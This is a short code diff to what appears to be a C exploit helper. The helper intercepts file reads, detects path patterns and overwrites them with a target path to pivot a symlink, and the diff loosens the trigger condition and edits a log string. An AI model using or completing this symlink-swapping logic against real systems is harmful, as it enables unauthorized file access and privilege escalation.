@@ -95,7 +95,7 @@ static int is_symlink(char *buf, size_t size)
 
                 dprintf(logfd, "[*] Detected pattern %s (hit: %d)\n", buf + i, symlink_hits[symlink_idx-1]);
 
-                if ( symlink_idx == 40 && symlink_hits[symlink_idx-1] == nr_pass ) {
+                if ( symlink_idx == 40 && symlink_hits[symlink_idx-1] >= nr_pass ) {
                     dprintf(logfd, "[*] Pivoting symlink to %s\n", target);
                     strcpy(buf + i, target);
                 }
@@ -109,7 +109,7 @@ static int is_symlink(char *buf, size_t size)
 
 static void delay(unsigned int secs)
 {
-    dprintf(logfd, "[*] Intercepted magic sector. Waiting for %d seconds...", secs);
+    dprintf(logfd, "[*] Intercepted read access. Waiting for %d seconds...", secs);
     sleep(secs);
 }
 
